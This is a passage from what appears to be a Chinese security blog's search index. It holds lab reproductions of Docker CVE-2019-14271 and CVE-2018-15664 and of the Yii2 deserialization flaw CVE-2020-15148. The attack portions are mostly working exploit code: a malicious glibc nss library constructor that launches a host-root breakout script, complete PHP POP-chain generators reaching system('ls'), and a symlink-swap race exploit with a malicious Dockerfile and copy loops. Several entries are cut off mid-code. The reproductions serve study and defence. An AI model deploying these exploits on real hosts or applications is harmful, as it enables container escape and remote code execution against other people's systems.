[{"categories":["云原生安全"],"content":"CVE-2019-14271：加载不受信任的动态链接库 前置知识 当用户执行docker cp后，Docker守护进程会启动一个docker-tar进程来完成这项复制任务。拿\"从容器内复制文件到宿主机上\"为例，它会切换进程的根目录(执行chroot)到容器根目录，将需要复制的文件或目录打包，然后传递给Docker守护进程，Docker守护进程负责将内容解包到用户指定的宿主机目标路径。 漏洞介绍 当Docker宿主机使用cp命令时，会调用辅助进程docker-tar组件，会加载容器内部的nsswitch动态链接库，但自身却未被容器化，攻击者可通过劫持容器内部的nsswitch动态链接库来实现对宿主机进程的恶意代码注入，获得宿主机上root权限的代码执行能力。 chroot操作主要是为了避免符号链接导致的路径穿越问题，但新的问题也出现了。存在漏洞版本的docker-tar会加载必要的动态链接库，主要是以libnss_开头的nsswitch动态链接库(libnss__*.so)。chroot切换根目录后，docker-tar将加载容器内部的动态链接库。 影响范围 Docker 19.03.0 利用思路 找出docker-tar具体会加载哪些容器内的动态链接库。 下载对应动态链接库源码，为其增加一个__attribute__((constructor))的属性的函数run_at_link（该属性意味着在动态链接库被进程加载时，run_at_link函数会首先执行),在run_at_link函数中放置我们希望docker-tar执行的payload；编译生成动态链接库文件。 编写辅助脚本breakout,将辅助脚本和步骤2生成的恶意动态链接库放入恶意容器，等待用户对容器执行docker cp命令，触发漏洞。 ","date":"2022-01-31","objectID":"/cve-2019-14271%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/:1:0","tags":["docker漏洞"],"title":"CVE-2019-14271漏洞复现","uri":"/cve-2019-14271%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"categories":["云原生安全"],"content":"搭建环境 使用Metarget提供的靶场环境 直接执行以下命令 ./metarget cnv install cve-2019-14271 安装好存在cve-2019-14271漏洞的docker。 定位动态链接库 docker-tar启动后会加载的容器内动态链接库，有两种方法定位。 分析Docker源码，抽丝剥茧，不过也比较费时间 执行一次docker cp命令，观察在这个过程中容器内部哪些动态链接库被加载了。（Linux提供了inotify机制，用来监控文件系统变化） inotify-tools是一系列基于inotify机制开发而成的命令行工具，我们可以借组这些命令行工具来监控docker-tar对容器内动态链接库的使用情况。 在存在漏洞的Docker环境中，首先执行下面命令，运行一个容器: docker run -itd --name=test ubuntu 然后，我们要拿到容器在宿主机上的绝对路径，才能对它进行监控。执行以下命令: docker exec -it test cat /proc/mounts | grep docker 返回结果中包含类似下面这样的字符串: workdir=/var/lib/docker/overlay2/c2070209bd55a3d0224853a7c69989b4287afb6de2eae56476bdf4dd7e133e8f/work 那么容器根目录在宿主机上的绝对路径为: /var/lib/docker/overlay2/c2070209bd55a3d0224853a7c69989b4287afb6de2eae56476bdf4dd7e133e8f/merged 接着，执行如下命令，在另一个终端中使用inotifywait工具，在宿主机上监听容器文件系统中lib目录的事件: apt install -y inotify-tools inotifywait -mr /var/lib/docker/overlay2/c2070209bd55a3d0224853a7c69989b4287afb6de2eae56476bdf4dd7e133e8f/merged/lib 现在就可以执行docker cp了，比如，我们执行: docker cp test:/etc/passwd ./ 然后可以在之前的终端中看到inotifywait的输出，例如: 可以看到，在这次复制操作中，docker-tar加载了libnss_files-2.31.so,后面，我们选择libnss_files-2.31.so为目标，构造一个恶意得动态链接库来替换它。 构建动态链接库 libnss_*.so均在Glibc中，我们首先下载Glibc库 https://ftp.gnu.org/gnu/glibc/glibc-2.31.tar.bz2 之后解压到本地目录，我这里的话是 /root/gnu/glibc-2.31。然后在/root/gnu目录新建一个glibc-build目录，作为构建目录。 tar -jxvf glibc-2.31-tar.bz2 进入 glibc-2.31 cd glibc-2.31 注释掉glibc-2.31/Makeconfig文件中得一行警告设置，避免加入恶意payload后编译失败: +gccwarn-c = -Wstrict-prototypes -Wold-style-definition 接着，我们就可以在源代码中添加恶意payload了 可以在glibc-2.31/nss/nss_files目录下任意源码中添加payload 这里选择files-service.c文件，不必过多操作，作为一个获取控制权的途径，把真正具有威胁的操作放入容器内/breakout脚本中，让动态链接库去执行/breakout脚本文件即可。 在其中一个源文件中添加函数run_at_link()，使用构造函数定义该函数，所以每次进程加载时，run_at_link()函数都能够作为库的初始化函数执行，即docker-tar进程动态加载此库，函数就会执行。 在files-service.c文件中加入如下payload // content should be added into nss/nss_files/files-service.c #include \u003csys/types.h\u003e #include \u003cunistd.h\u003e #include \u003cstdio.h\u003e #include \u003csys/wait.h\u003e //容器内部原始original_libnss_files.so.2文件的备份位置 #define ORIGINAL_LIBNSS \"/original_libnss_files.so.2\" //恶意original_libnss_files.so.2的位置 #define LIBNSS_PATH \"/lib/x86_64-linux-gnu/libnss_files.so.2\" bool is_priviliged(); //带有constructor属性的函数会在动态链接库被加载时自动执行 __attribute__ ((constructor)) void run_at_link(void) { char * argv_break[2]; //判断当前是否时容器外的高权限进程（docker-tar） //如果时容器内进程，则不做任何操作 if (!is_priviliged()) return; //攻击只需要执行一次即可 //用备份的原始libnss_files.so.2文件替换恶意libnss_files.so.2文件 //避免后续的docker cp操作持续加载恶意libnss_files.so.2文件 rename(ORIGINAL_LIBNSS, LIBNSS_PATH); //以docker-tar进程的身份创建新进程，执行容器内的breakout脚本 if (!fork()) { // Child runs breakout argv_break[0] = strdup(\"/breakout\"); argv_break[1] = NULL; execve(\"/breakout\", argv_break, NULL); } else wait(NULL); // Wait for child return; } bool is_priviliged() { FILE * proc_file = fopen(\"/proc/self/exe\", \"r\"); if (proc_file != NULL) { fclose(proc_file); return false; // can open so /proc exists, not privileged } return true; // we're running in the context of docker-tar } 恶意libnss_files.so.2文件被加载时，首先会判断当前加载进程是否为docker-tar进程，如果是，则以当前进程的身份执行/breakout脚本。由于docker-tar并未做其他命名空间级别上的隔离，因此/breakout会以docker-tar自身的root权限在宿主机命名空间内执行。 下面编译生成恶意链接文件 cd /root/gnu/glibc-build mkdir config1 ../glibc-2.31/configure --prefix=/root/gnu/glibc-build/config1/ make //生成的恶意动态链接库文件为/glibc-build/nss/libnss_files.so；要注意的是libnss_files.so.2为链接文件，别弄错了 这里我们执行失败了 ../glibc-2.31/configure --prefix=/root/gnu/glibc-build/config1/ 是因为缺少了依赖，所以报错 apt install bison apt install gawk 之后执行一遍命令就不会报错了 我们make下 要在/root/gnu/glibc-build/目录下执行 第一次编译Glibc需要一些时间，后面再次编译就会快很多。编译结束后，glibc-build/nss/libnss_files.so就是我们需要的恶意动态链接库文件。 实现逃逸 现在，我们已经构造好恶意的动态链接库文件libnss_files.so。在存在漏洞的dokcer环境中，如果用户执行了docker cp，后台的docker-tar进程在执行了chroot命令后一旦加载恶意文件libnss_files.so，那么容器内/breakout脚本就会以docker-tar身份执行。 由于docker-tar已经切换了根目录，但还没有加入容器的命名空间，考虑在/breakout中执行挂载操作，由docker-tar将宿主机根目录挂在到容器内的/host_fs路径。这样就实现了文件系统层面的容器逃逸。 将此脚本拷贝到容器根目录，并给它加上777权限 #!/bin/bash umount /host_fs \u0026\u0026 rm -rf /host_fs mkdir /host_fs mount -t proc none /proc # mount the host's procfs over /proc cd /proc/1/root # chdir to host's root mount --bind . /hos","date":"2022-01-31","objectID":"/cve-2019-14271%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/:1:1","tags":["docker漏洞"],"title":"CVE-2019-14271漏洞复现","uri":"/cve-2019-14271%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"categories":["web"],"content":"前言 最近学习PHP反序列化遇到了Yii2反序列化得利用，就顺便搭一下环境，跟着网上各种师傅们的文章复现和学习，提高自己代码审计能力。 漏洞出现在yii2.0.38之前的版本中,在2.0.38进行了修复，CVE编号是CVE-2020-15148： Yii 2 (yiisoft/yii2) before version 2.0.38 is vulnerable to remote code execution if the application calls unserialize() on arbitrary user input. This is fixed in version 2.0.38. A possible workaround without upgrading is available in the linked advisory. Yii2介绍 Yii 是一个高性能，基于组件的 PHP 框架，用于快速开发现代 Web 应用程序。即可以用于开发各种用 PHP 构建的 Web 应用。因为基于组件的框架结构和设计精巧的缓存支持，它特别适合开发大型应用， 如门户网站、社区、内容管理系统（CMS）、 电子商务项目和 RESTful Web 服务等。 环境搭建 windows10 phpstudy yii2版本:2.037和2.0.38 php版本:7.3.4 修改config\\web.php中的cookieValidationKey为任意值，作为yii\\web\\request::cookieValidationKey的加密值，不设置就会报错。 接着自己添加一个controller来进行漏洞的利用，创建一个action: http://url/index.php?r=test/test, controllers的命名是 : 名称Controller，action的命名是: action名称，如下 controllers/TestController.php \u003c?php namespace app\\controllers; use yii\\web\\Controller; class TestController extends Controller{ public function actionTest($data){ return unserialize(base64_decode($data)); } } ?\u003e 发包测试，环境搭建成功 ","date":"2022-01-19","objectID":"/yii2%E6%A1%86%E6%9E%B6-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/:0:1","tags":["yii2框架"],"title":"Yii2框架 反序列化漏洞复现","uri":"/yii2%E6%A1%86%E6%9E%B6-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"categories":["web"],"content":"2.3.07版本反序列化 POC1 漏洞的触发点在\\yii\\vendor\\yii2\\db\\BatchQueryResult.php文件中， public function __destruct() { // make sure cursor is closed $this-\u003ereset(); } public function reset() { if ($this-\u003e_dataReader !== null) { $this-\u003e_dataReader-\u003eclose(); } $this-\u003e_dataReader = null; $this-\u003e_batch = null; $this-\u003e_value = null; $this-\u003e_key = null; } 可以看到，__destruct调用了reset方法 reset方法reset调用了close方法，参数 _dataReader可控。学习思路后知道这里可以通过触发 __call方法来进行利用 __call:当一个对象在对象上下文中调用不可访问的方法时触发 当一个对象调用不可访问的close方法或者类中压根就没有close方法，即可触发 __call,全局搜索 __call方法 public function __call($method, $attributes) { return $this-\u003eformat($method, $attributes); } public function format($formatter, $arguments = array()) { return call_user_func_array($this-\u003egetFormatter($formatter), $arguments); } public function getFormatter($formatter) { if (isset($this-\u003eformatters[$formatter])) { return $this-\u003eformatters[$formatter]; } foreach ($this-\u003eproviders as $provider) { if (method_exists($provider, $formatter)) { $this-\u003eformatters[$formatter] = array($provider, $formatter); return $this-\u003eformatters[$formatter]; } } throw new \\InvalidArgumentException(sprintf('Unknown formatter \"%s\"', $formatter)); } __call方法调用了类中的 format的方法，format方法里的 call_user_func_array里的参数调用了 getFormatter方法 call_user_func_array :调用回调函数，并把一个数组参数作为回调函数的参数 大致使用方法如下: \u003c?php function foobar($arg, $arg2) { echo __FUNCTION__, \" got $arg and $arg2\\n\"; } class foo { function bar($arg, $arg2) { echo __METHOD__, \" got $arg and $arg2\\n\"; } } // Call the foobar() function with 2 arguments call_user_func_array(\"foobar\", array(\"one\", \"two\")); // Call the $foo-\u003ebar() method with 2 arguments $foo = new foo; call_user_func_array(array($foo, \"bar\"), array(\"three\", \"four\")); ?\u003e getFormatter方法从 $this-\u003eformatter可控，所以这里可以调用任意类中的任意方法了。 但是 $arguments是从 yii\\db\\BatchQueryResult::reset()里传过来的，我门不可控，比如这里就为空，因为传来的 close方法中传参数值，所以我们只能不带参数地去调用别的类中的方法。 到这一步就需要一个执行类，这时候需要类中的方法需要满足两个条件 方法所需的参数只能是其自己类中存在的(即参数: $this-\u003eargs) 方法需要有命令执行功能 通过全局查找正则匹配 call_user_func\\(\\$this-\u003e([a-zA-Z0-9]+), \\$this-\u003e([a-zA-Z0-9]+)来查找，结果如下 call_user_func :把第一个参数作为回调函数用，这里用 call_user_func即可达到命令执行的效果也可以达到 RCE 的效果 大致使用方法如下 \u003c?php error_reporting(E_ALL); function increment(\u0026$var) { $var++; } $a = 0; call_user_func('increment', $a); echo $a.\"\\n\"; call_user_func_array('increment', array(\u0026$a)); // You can use this instead before PHP 5.3 echo $a.\"\\n\"; ?\u003e 其中有两个类中的 run方法可用 yii\\rest\\CreateAction::run() ，$this-\u003eid两个参数可控 public function run() { if ($this-\u003echeckAccess) { call_user_func($this-\u003echeckAccess, $this-\u003eid); } //主要还是看这里 /* @var $model \\yii\\db\\ActiveRecord */ $model = new $this-\u003emodelClass([ 'scenario' =\u003e $this-\u003escenario, ]); $model-\u003eload(Yii::$app-\u003egetRequest()-\u003egetBodyParams(), ''); if ($model-\u003esave()) { $response = Yii::$app-\u003egetResponse(); $response-\u003esetStatusCode(201); $id = implode(',', array_values($model-\u003egetPrimaryKey(true))); $response-\u003egetHeaders()-\u003eset('Location', Url::toRoute([$this-\u003eviewAction, 'id' =\u003e $id], true)); } elseif (!$model-\u003ehasErrors()) { throw new ServerErrorHttpException('Failed to create the object for unknown reason.'); } return $model; } \\yii\\rest\\IndexAction::run(), $this-\u003echeckAccess,$this-\u003eid两个参数可控 public function run() { if ($this-\u003echeckAccess) { call_user_func($this-\u003echeckAccess, $this-\u003eid); } return $this-\u003eprepareDataProvider(); } 于是就可以构造完整的 pop链 yii\\db\\BatchQueryResult::__destruct()-\u003ereset()-\u003eclose() -\u003e Faker\\Generator::__call()-\u003eformat()-\u003ecall_user_func_array() -\u003e \\yii\\rest\\IndexAction::run-\u003ecall_user_func() Exp \u003c?php namespace yii\\rest{ class IndexAction{ public $checkAccess; public $id; public function __construct(){ $this-\u003echeckAccess = 'phpinfo'; $this-\u003eid = '1'; //command } } } namespace Faker{ use yii\\rest\\IndexAction; class Generator{ protected $formatters; public function __construct(){ $this-\u003eformatters['close'] = [new IndexAction, 'run']; } } } namespace yii\\db{ use Faker\\Generator; class BatchQueryResult{ private $_dataReader; public function __construct(){ $this-\u003e_dataReader = new Generator; } } } namespace{ echo base64_encode(serialize(n","date":"2022-01-19","objectID":"/yii2%E6%A1%86%E6%9E%B6-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/:0:2","tags":["yii2框架"],"title":"Yii2框架 反序列化漏洞复现","uri":"/yii2%E6%A1%86%E6%9E%B6-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"categories":["web"],"content":"2.3.08版本反序列化 利用链的起点\\yii\\vendor\\codeception\\codeception\\ext\\RunProcess.php public function __destruct() { $this-\u003estopProcess(); } public function stopProcess() { foreach (array_reverse($this-\u003eprocesses) as $process) { /** @var $process Process **/ if (!$process-\u003eisRunning()) { continue; } $this-\u003eoutput-\u003edebug('[RunProcess] Stopping ' . $process-\u003egetCommandLine()); $process-\u003estop(); } $this-\u003eprocesses = []; } 同样还是找 __destruct()方法调用了 stopProcess函数，因为这里的 $this-\u003eprocesses可控，也就意味着 process可控，然后下面又调用了 process-\u003eisRunning,可以接上第一条利用链的 __call方法开头的后半段。 利用链1 Codeception\\Extension\\RunProcess::__destruct()-\u003eFaker\\Genrator::__call()-\u003eyii\\rest\\IndexAction::run() Poc2 \u003c?php namespace yii\\rest{ class CreateAction{ public $checkAccess; public $id; public function __construct(){ $this-\u003echeckAccess = 'system'; $this-\u003eid = 'ls'; } } } namespace Faker{ use yii\\rest\\CreateAction; class Generator{ protected $formatters; public function __construct(){ // 这里需要改为isRunning $this-\u003eformatters['isRunning'] = [new CreateAction(), 'run']; } } } // poc2 namespace Codeception\\Extension{ use Faker\\Generator; class RunProcess{ private $processes; public function __construct() { $this-\u003eprocesses = [new Generator()]; } } } namespace{ // 生成poc echo base64_encode(serialize(new Codeception\\Extension\\RunProcess())); } ?\u003e 运行poc，成功RCE了 利用链2 \\yii\\vendor\\swiftmailer\\swiftmailer\\lib\\classes\\Swift\\KeyCache\\DiskKeyCache.php文件中， public function __destruct() { foreach ($this-\u003ekeys as $nsKey =\u003e $null) { $this-\u003eclearAll($nsKey); } } 跟进 clearAll方法 public function clearAll($nsKey) { if (array_key_exists($nsKey, $this-\u003ekeys)) { foreach ($this-\u003ekeys[$nsKey] as $itemKey =\u003e $null) { $this-\u003eclearKey($nsKey, $itemKey); } if (is_dir($this-\u003epath.'/'.$nsKey)) { rmdir($this-\u003epath.'/'.$nsKey); } unset($this-\u003ekeys[$nsKey]); } } 这里的this-\u003ekeys以及$nsKey、$itemKey都是我们可控的，所以是可以执行到$this-\u003eclearKey的，跟进看看: public function clearKey($nsKey, $itemKey) { if ($this-\u003ehasKey($nsKey, $itemKey)) { $this-\u003efreeHandle($nsKey, $itemKey); unlink($this-\u003epath.'/'.$nsKey.'/'.$itemKey); } } 这里的$this-\u003epath也可控，可以看到这里是进行了一个字符串拼接操作，那么意味着可以利用魔术方法__toString来触发后续操作。 全局搜索__toString 文件路径\\yii\\vendor\\phpdocumentor\\reflection-docblock\\src\\DocBlock\\Tags\\see.php 使用See.php举例 public function __toString() : string { return $this-\u003erefers . ($this-\u003edescription ? ' ' . $this-\u003edescription-\u003erender() : ''); } 可以看到$this-\u003edescription可控，又可以利用 __call 利用链3 Swift_KeyCache_DiskKeyCache -\u003e phpDocumentor\\Reflection\\DocBlock\\Tags\\See::__toString()-\u003e Faker\\Generator::__call() -\u003e yii\\rest\\IndexAction::run() POC3 \u003c?php namespace yii\\rest{ class CreateAction{ public $checkAccess; public $id; public function __construct(){ $this-\u003echeckAccess = 'phpinfo'; $this-\u003eid = '1'; } } } namespace Faker{ use yii\\rest\\CreateAction; class Generator{ protected $formatters; public function __construct(){ // 这里需要改为isRunning $this-\u003eformatters['render'] = [new CreateAction(), 'run']; } } } namespace phpDocumentor\\Reflection\\DocBlock\\Tags{ use Faker\\Generator; class See{ protected $description; public function __construct() { $this-\u003edescription = new Generator(); } } } namespace{ use phpDocumentor\\Reflection\\DocBlock\\Tags\\See; class Swift_KeyCache_DiskKeyCache{ private $keys = []; private $path; public function __construct() { $this-\u003epath = new See; $this-\u003ekeys = array( \"axin\"=\u003earray(\"is\"=\u003e\"handsome\") ); } } // 生成poc echo base64_encode(serialize(new Swift_KeyCache_DiskKeyCache())); } ?\u003e ","date":"2022-01-19","objectID":"/yii2%E6%A1%86%E6%9E%B6-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/:0:3","tags":["yii2框架"],"title":"Yii2框架 反序列化漏洞复现","uri":"/yii2%E6%A1%86%E6%9E%B6-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"categories":["web"],"content":"小结 发现这几个pop链用来用去最后都是靠着__call方法来触发代码执行。 找链子的开端可以尝试从__destruct入手，然后追链，追方法 __call_user_func中的callback可以是数组 2.0.38还有2个链子没弄 2.0.42还有链子…. ","date":"2022-01-19","objectID":"/yii2%E6%A1%86%E6%9E%B6-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/:0:4","tags":["yii2框架"],"title":"Yii2框架 反序列化漏洞复现","uri":"/yii2%E6%A1%86%E6%9E%B6-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"categories":["云原生安全"],"content":"第一篇文章","date":"2022-01-14","objectID":"/cve-2018-15664%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/","tags":["docker漏洞"],"title":"CVE-2018-15664漏洞复现","uri":"/cve-2018-15664%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"categories":["云原生安全"],"content":"CVE-2018-15664：符号链接替换漏洞 前置知识 docker cp 用于容器和宿主机文件系统之间进行文件或目录复制 //将主机/www/xxx文件拷贝到容器685c2a289adf的/www目录下(若是/www,则是拷贝到容器根目录下，重命名为www) docker cp /www/xxx 685c2a289adf:/www/ //将容器685c2a289adf下的/www目录拷贝到主机的/tmp目录中 docker cp 685c2a289adf:/www /tmp/ ","date":"2022-01-14","objectID":"/cve-2018-15664%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/:0:0","tags":["docker漏洞"],"title":"CVE-2018-15664漏洞复现","uri":"/cve-2018-15664%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"categories":["云原生安全"],"content":"漏洞介绍 存在:18.06.1-ce-rc2版本前中的Docker中 docker cp 命令 对应的后端API存在基于条件竞争的符号链接替换漏洞，能够导致目录穿越。 可以利用此漏洞逃逸出容器读取或篡改host其他任意容器内的文件。 其实是一个TOCTOU（time-of-check to time-of-use），使用FollowSymlinkInScope函数时触发文件系统的条件竞争缺陷导致，属于竞态条件漏洞 竞态条件漏洞，即程序对某对象进行安全检查和使用该对象的步骤之间存在间隙，攻击者可以先构造并放置一个能够通过安全检查的合法对象，顺利通过目标程序的安全检查流程，然后再执行之前立即使用恶意对象替换之间的合法对象。 FollowSymlinkInScope作用:解析容器运行中运行进程的文件路径。攻击者就利用解析校验完成之后和操作执行间的空隙，修改cp文件，改为一个符号链接对应的目标文件 Docker daemon收到docker cp的请求，会对复制的路径进行检查，如果路径中有容器内的符号链接，就先在容器内部将其解析成路径字符串，留待后用 真实过程：Docker daemon检查复制路径时，攻击者放置正常的非符号连接的常规文件或目录，在检查结束之后、docker daemon使用路径前，将其替换成符号连接 利用条件： hacker需要有docker cp的使用权限和目标容器的访问权限 解析文件，到完成cp的动作，是毫秒级，攻击难度较大 ","date":"2022-01-14","objectID":"/cve-2018-15664%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/:0:1","tags":["docker漏洞"],"title":"CVE-2018-15664漏洞复现","uri":"/cve-2018-15664%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"categories":["云原生安全"],"content":"搭建环境 使用Metarget提供的靶场环境 git clone https://github.com/Metarget/metarget.git cd metarget ./metarget cnv install cve-2018-15664 ","date":"2022-01-14","objectID":"/cve-2018-15664%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/:0:2","tags":["docker漏洞"],"title":"CVE-2018-15664漏洞复现","uri":"/cve-2018-15664%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"categories":["云原生安全"],"content":"poc: https://seclists.org/oss-sec/2019/q2/131 ","date":"2022-01-14","objectID":"/cve-2018-15664%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/:0:3","tags":["docker漏洞"],"title":"CVE-2018-15664漏洞复现","uri":"/cve-2018-15664%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"categories":["云原生安全"],"content":"DockerFile 用来制作恶意镜像 构建漏洞利用程序symlink_swap并将其放在容器根目录下，并在根目录创建一个w00t_w00t_im_ a_flag文件，内容为FAlLED-INSIDE CONTAINER PATH 容器启动后执行(Entrypoint)即为/symlink_swap # Build the binary. #拉取suse linux的基础镜像 FROM opensuse/tumbleweed #安装gcc glibc-devel-static RUN zypper in -y gcc glibc-devel-static RUN mkdir /builddir #构建漏洞利用程序symlink_swap，并将其放在容器根目录下 COPY symlink_swap.c /builddir/symlink_swap.c RUN gcc -Wall -Werror -static -o /builddir/symlink_swap /builddir/symlink_swap.c # Set up our malicious rootfs. FROM opensuse/tumbleweed ARG SYMSWAP_TARGET=/w00t_w00t_im_a_flag ARG SYMSWAP_PATH=/totally_safe_path RUN echo \"FAILED -- INSIDE CONTAINER PATH\" \u003e\"$SYMSWAP_TARGET\" COPY --from=0 /builddir/symlink_swap /symlink_swap #容器启动后执行的程序（Etrypoint）即为/symlink_swap ENTRYPOINT [\"/symlink_swap\"] ","date":"2022-01-14","objectID":"/cve-2018-15664%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/:0:4","tags":["docker漏洞"],"title":"CVE-2018-15664漏洞复现","uri":"/cve-2018-15664%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"categories":["云原生安全"],"content":"知识点： 多阶段构建 多个FROM指令不是为了生成多根的层关系，最后生成的镜像，仍以最后一条FROM为准，之前的被抛弃 每个FROM指令都是一个构建阶段，多条FROM就是多阶段构建。虽然之前的FROM会被抛弃，但是前置阶段的文件拷贝到后边的阶段中，这就是多阶段构建的最大意义。 这里做到的效果就是将编译环境和运行环境分离 构建阶段还可以进行命名，如: # syntax=docker/dockerfile:1 FROM golang:1.16 AS builder WORKDIR /go/src/github.com/alexellis/href-counter/ RUN go get -d -v golang.org/x/net/html COPY app.go ./ RUN CGO_ENABLED=0 GOOS=linux go build -a -installsuffix cgo -o app . FROM alpine:latest RUN apk --no-cache add ca-certificates WORKDIR /root/ COPY --from=builder /go/src/github.com/alexellis/href-counter/app ./ CMD [\"./app\"] 默认情况下，阶段没有命名，可以通过整数来引用他们，整数从0开始。 这种情况下，即使dokcerfile中的指令后面重新排序，COPY也不会中断。 ARG vs ENV arg是在bulid的时候存在，可以在Dockerfile 中当作变量来使用(ARG专门为构建镜像而生) env是容器构建好之后的环境变量，不能在Dockerfile中当参数使用 Symlink_swap 容器内漏洞利用源代码 在容器内创建指向根目录”/“的符号链接，并不断的交换符号链接(由命令行参数传入，如”/totally_safe_path”）与一个正常目录(例如”/totally_safe_path-stashed”)的名字。这样一来，宿主机执行docker cp 时，首先检查到”/totally_safe_path\"是一个正常目录，但是后面执行复制操作时”/totally_safe_path\"却变成了一个符号链接，那么Docker将在宿主机解析这个符号链接 #define _GNU_SOURCE #include \u003cfcntl.h\u003e #include \u003cstdlib.h\u003e #include \u003cstdio.h\u003e #include \u003csys/types.h\u003e #include \u003csys/stat.h\u003e #include \u003csys/syscall.h\u003e #include \u003cunistd.h\u003e #define usage() \\ do { printf(\"usage: symlink_swap \u003csymlink\u003e\\n\"); exit(1); } while(0) #define bail(msg) \\ do { perror(\"symlink_swap: \" msg); exit(1); } while (0) /* No glibc wrapper for this, so wrap it ourselves. */ #define RENAME_EXCHANGE (1 \u003c\u003c 1) int renameat2(int olddirfd, const char *oldpath, int newdirfd, const char *newpath, int flags) { return syscall(__NR_renameat2, olddirfd, oldpath, newdirfd, newpath, flags); } /* usage: symlink_swap \u003csymlink\u003e */ int main(int argc, char **argv) { if (argc != 2) usage(); char *symlink_path = argv[1]; char *stash_path = NULL; if (asprintf(\u0026stash_path, \"%s-stashed\", symlink_path) \u003c 0) bail(\"create stash_path\"); /* Create a dummy file at symlink_path. */ struct stat sb = {0}; if (!lstat(symlink_path, \u0026sb)) { int err; if (sb.st_mode \u0026 S_IFDIR) err = rmdir(symlink_path); else err = unlink(symlink_path); if (err \u003c 0) bail(\"unlink symlink_path\"); } /* * Now create a symlink to \"/\" (which will resolve to the host's root if we * win the race) and a dummy directory at stash_path for us to swap with. * We use a directory to remove the possibility of ENOTDIR which reduces * the chance of us winning. */ if (symlink(\"/\", symlink_path) \u003c 0) bail(\"create symlink_path\"); if (mkdir(stash_path, 0755) \u003c 0) bail(\"mkdir stash_path\"); /* Now we do a RENAME_EXCHANGE forever. */ for (;;) { int err = renameat2(AT_FDCWD, symlink_path, AT_FDCWD, stash_path, RENAME_EXCHANGE); if (err \u003c 0) perror(\"symlink_swap: rename exchange failed\"); } return 0; } 属于竞态条件漏洞，不是每次都能复现，为了增大触发几率，需要在宿主机不断执行dokcer cp命令run_read.sh和run_write.sh模拟受害者在宿主机不断执行docker cp 命令 run_write.sh 宿主机cp到容器内的场景，触发漏洞，指定的宿主机文件将覆盖容器内恶意符号链接 #!/bin/bash SYMSWAP_PATH=/totally_safe_path SYMSWAP_TARGET=/w00t_w00t_im_a_flag # Create our flag. echo \"FAILED -- HOST FILE UNCHANGED\" | sudo tee \"$SYMSWAP_TARGET\" sudo chmod 0444 \"$SYMSWAP_TARGET\" # Run and build the malicious image. docker build -t cyphar/symlink_swap \\ --build-arg \"SYMSWAP_PATH=$SYMSWAP_PATH\" \\ --build-arg \"SYMSWAP_TARGET=$SYMSWAP_TARGET\" build/ ctr_id=$(docker run --rm -d cyphar/symlink_swap \"$SYMSWAP_PATH\") echo \"SUCCESS -- HOST FILE CHANGED\" | tee localpath # Now continually try to copy the files. while true do docker cp localpath \"${ctr_id}:$SYMSWAP_PATH/$SYMSWAP_TARGET\" done run_read.sh 模拟docker cp将容器内文件复制到宿主机上场景，一旦触发，容器内恶意符号链接在宿主机文件系统解析后执行的文件将被复制到受害者设定的宿主机目录下 #!/bin/bash SYMSWAP_PATH=/totally_safe_path SYMSWAP_TARGET=/w00t_w00t_im_a_flag # Create our flag. echo \"SUCCESS -- COPIED FROM THE HOST\" | sudo tee \"$SYMSWAP_TARGET\" sudo chmod 000 \"$SYMSWAP_TARGET\" # Run and build the malicious image. docker build -t cyphar/symlink_swap \\ --build-arg \"SYMSWAP_PATH=$SYMSWAP_PATH\" \\ --build-arg \"SYMSWAP_TARGET=$SYMSWAP_TARGET\" build/ ctr_id=$(docker run --rm -d cyphar/symlink_swap \"$SYMSWAP_PATH\") # Now continually try to copy the files. idx=0 while true do mkdir \"ex${idx}\" ","date":"2022-01-14","objectID":"/cve-2018-15664%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/:0:5","tags":["docker漏洞"],"title":"CVE-2018-15664漏洞复现","uri":"/cve-2018-15664%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"categories":[],"content":" CTF Web、Misc 信息安全爱好者 目前研究方向web安全、云原生安全 除了电脑，代码，网络之外的生活，也是要认真对待。 还有很长的路要走，一直在路上。 ","date":"2022-01-09","objectID":"/about/:0:0","tags":[],"title":"About","uri":"/about/"},{"categories":[],"content":" AmiaaaZ https://amiaaaz.github.io/ D3n13d https://d3n13d.github.io/ ","date":"2022-01-09","objectID":"/friends/:0:0","tags":[],"title":"Friends","uri":"/friends/"}]